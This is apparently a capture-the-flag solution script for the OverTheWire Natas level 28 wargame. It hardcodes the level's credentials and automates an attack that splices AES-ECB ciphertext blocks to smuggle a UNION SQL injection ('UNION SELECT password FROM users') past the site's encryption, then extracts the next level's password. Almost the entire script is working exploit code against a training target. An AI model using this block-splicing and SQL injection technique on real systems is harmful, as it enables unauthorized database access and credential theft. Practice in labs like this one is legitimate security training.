#!/usr/bin/env python

import math
import requests
import re

import base64

username = 'natas28'
password = 'skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

block_size = 16
injection = 'A'*9 + "' UNION SELECT password FROM users; #"

blocks = int(( len(injection) - 10 ) / block_size)
if ( len(injection) - 10 ) % block_size != 0: blocks += 1

response = session.post(url, auth = (username, password),
						data = {"query":injection})

raw_inject = base64.b64decode(requests.utils.unquote(response.url[60:]))

response = session.post(url, auth = (username, password),
						data = {"query":'A'*10})

good_base = base64.b64decode(requests.utils.unquote(response.url[60:]))

query = good_base[:block_size*3] + raw_inject[block_size*3:block_size*3+(blocks*block_size)] + good_base[block_size*3:]
for i in range(math.ceil(len(query) / 16)):
	print(query[i*16:(i+1)*16].hex())
print(base64.b64encode(query))
query = requests.utils.quote(bytes.decode(base64.b64encode(query)))

print("\n" + query + "\n")

response = session.get(url + '/search.php/?query='+query, auth=(username, password))
print(re.findall(r'<li>(.*)</li>',response.text)[0])

